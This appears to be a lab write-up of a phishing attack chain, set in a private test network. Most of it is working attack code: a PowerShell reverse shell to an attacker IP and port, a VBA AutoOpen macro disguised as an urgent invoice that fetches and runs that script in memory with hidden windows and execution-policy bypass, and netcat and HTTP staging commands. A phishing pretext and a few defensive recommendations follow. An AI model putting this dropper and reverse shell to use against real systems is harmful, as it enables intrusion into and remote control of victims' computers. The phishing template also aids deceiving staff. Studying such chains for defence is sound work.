## Attack Execution

### Phase 1 — Weaponization

**PowerShell reverse shell** (`stage2.ps1`) — fileless, no external dependencies:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.56.103', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**VBA macro** (`Fatura_Urgente.docm`) — AutoOpen dropper that downloads and executes the payload in memory:

```vba
Sub AutoOpen()
    On Error Resume Next
    Dim cmd As String
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass " & _
          "-Command ""IEX (New-Object Net.WebClient)." & _
          "DownloadString('http://192.168.56.103:8000/stage2.ps1')"""
    Shell cmd, vbHide
    MsgBox "Documento carregado com sucesso!", vbInformation, "Fatura"
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

Key techniques: `AutoOpen()` auto-execution · `-WindowStyle Hidden` · `-ExecutionPolicy Bypass` · in-memory staging via `DownloadString` · social engineering `MsgBox`

### Phase 2 — Delivery

Phishing email delivered via Thunderbird (local, no SMTP) as a `.eml` file transferred via shared folder.

| Field | Value |
|---|---|
| From | "Departamento Financeiro" \<jorge.financas@money.pt\> |
| To | maria.vitima@money.pt |
| Subject | URGENTE: Fatura Pendente de Pagamento #2024-4387 |

| Pretext | Unpaid invoice, 48h deadline — urgency-based social engineering |

### Phase 3 — C2 Setup

```bash
# Terminal 1 — reverse shell listener
nc -lvnp 4444

# Terminal 2 — payload staging server
cd ~/ataque && python3 -m http.server 8000
```

Attack flow:
```
Fatura_Urgente.docm  →  VBA AutoOpen()  →  PowerShell download (HTTP:8000)
                                                        ↓
                     Reverse shell  ←  Execute stage2.ps1 (in memory)
                        TCP:4444
```

## Defensive Recommendations

- Email gateway filtering with attachment sandboxing
- Disable VBA macros via Group Policy (or allow only signed macros)
- PowerShell Constrained Language Mode and Script Block Logging
- Block outbound HTTP from Office processes (AppLocker / WDAC)
- User awareness training on spearphishing with urgency pretexts
